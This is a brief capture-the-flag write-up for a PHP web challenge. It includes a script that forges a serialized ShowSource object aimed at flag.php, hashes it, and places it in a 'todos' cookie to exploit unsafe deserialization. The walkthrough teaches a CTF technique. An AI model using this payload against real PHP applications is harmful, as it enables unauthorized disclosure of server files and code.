# Todo List by Om Honrao @Om12



====================================================

# This challenge comes in web category.

# PHP Object Injection needed here.

PHP Serialisation here means, we can inject arbitrary code by pointing the "Show code" class to flag.php.

# This will need php scripting.

I got help from this write up:- 

https://hack.more.systems/writeup/2016/10/02/tumctf-web50/

# Note:- You can't directly copy paste the code from there it needs modifications.

I made some changes and got this script:- 

```php
<?php 

Class ShowSource{
    public function __toString()
    {
        return highlight_file($this->source, true);
    }
}


$foo = new ShowSource();
$foo->source = 'flag.php';

$bar = [];
$bar[] = $foo;

$m = serialize($bar);
$h = sha1($m);

echo urlencode($h.$m);

?>
```
You need to run the code (I executed it online) and you will get a string.

Which is what we need.

Add a cookie named `todos` with the value as the string you got after executing the php code.

Now just refresh...you get the flag...xD

